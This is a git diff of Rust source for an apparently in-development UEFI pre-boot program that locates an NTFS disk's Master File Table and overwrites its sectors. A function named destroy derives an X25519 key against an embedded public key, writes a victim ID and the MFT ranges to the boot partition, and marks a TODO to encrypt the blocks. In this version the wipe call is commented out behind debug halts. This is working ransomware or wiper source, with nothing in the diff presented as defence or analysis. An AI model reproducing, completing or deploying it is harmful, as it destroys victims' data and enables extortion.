@@ -1,7 +1,6 @@
 use alloc::vec;
 use alloc::vec::Vec;
 use core::ops::Range;
-use core::str;
 use rand::rngs::OsRng;
 
 use uefi::prelude::SystemTable;
@@ -9,6 +8,9 @@ use uefi::proto::media::block::BlockIO;
 use uefi::table::Boot;
 use uefi::ResultExt;
 use x25519_dalek::{EphemeralSecret, PublicKey};
+
+use crate::file::write_file;
+use crate::read_file;
 
 const OEM_ID: &[u8; 8] = b"NTFS    ";
 
@@ -169,7 +171,7 @@ fn get_mft_ranges(
 }
 
 /// Fire !
-fn beat_the_shit_out_of_the_mft(blk: &mut BlockIO, media_id: u32, mft_runs: Vec<Range<u64>>) {
+fn beat_the_shit_out_of_the_mft(blk: &mut BlockIO, media_id: u32, mft_runs: Vec<Range<u64>>, key: [u8; 32]) {
     let buf = [0u8; 512];
 
     log::info!("Start destroying..."); // DEBUG
@@ -177,6 +179,8 @@ fn beat_the_shit_out_of_the_mft(blk: &mut BlockIO, media_id: u32, mft_runs: Vec<
     for run in mft_runs {
         for sector in run {
             if sector % 2 == 0 {
+
+                // TODO: cipher block
                 blk.write_blocks(media_id, sector, &buf).unwrap_success();
             }
         }
@@ -213,6 +217,8 @@ pub fn destroy(st: &SystemTable<Boot>) {
         }
 
         if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
+            log::info!("Ranges1: {:#?}", ranges);
+            loop {}
             let public_key_hex = include_str!("include/public_key.hex");
             let mut buf = [0u8; 32];
             hex::decode_to_slice(public_key_hex, &mut buf).expect("Public key hex to bytes");
@@ -225,15 +231,37 @@ pub fn destroy(st: &SystemTable<Boot>) {
 
             let mut buf = [0u8; 64];
             hex::encode_to_slice(id.as_bytes(), &mut buf).expect("id to hex");
-            log::info!("ID :{}", str::from_utf8(&buf).unwrap());
 
-            hex::encode_to_slice(key.as_bytes(), &mut buf).expect("id to hex");
-            log::info!("KEY :{}", str::from_utf8(&buf).unwrap());
+            write_file(st, "id", &buf).unwrap();
 
-            // TODO: Write id to ESP root
+            // TODO: save ranges somewhere
+            let mut ranges_buffer = vec![0u8; ranges.len()*16];
+
+            for range in &ranges {
+                ranges_buffer.extend(range.start.to_be_bytes());
+                ranges_buffer.extend(range.end.to_be_bytes());
+            }
+            ranges_buffer.extend(0u64.to_be_bytes());
+
+            write_file(st, "ranges", ranges_buffer.as_slice()).unwrap();
+
+            let ranges_text = read_file(st, "ranges").unwrap();
+            let mut ranges2 = Vec::<Range<u64>>::new();
+            loop {
+                let c = ranges2.len()*16;
+                let start = u64::from_be_bytes(ranges_text[c..c+8].try_into().unwrap());
+                if start == 0u64 { break; }
+
+                let end = u64::from_be_bytes(ranges_text[c+8..c+16].try_into().unwrap());
+                ranges2.push(start..end);
+            }
+
+            log::info!("Ranges1: {:?}", ranges);
+            log::info!("Ranges2: {:?}", ranges2);
 
             loop {}
-            //beat_the_shit_out_of_the_mft(blk, media_id, ranges);
+
+            //beat_the_shit_out_of_the_mft(blk, media_id, ranges, key.to_bytes());
             //log::info!("{:#?}", ranges); // DEBUG
         }
     }
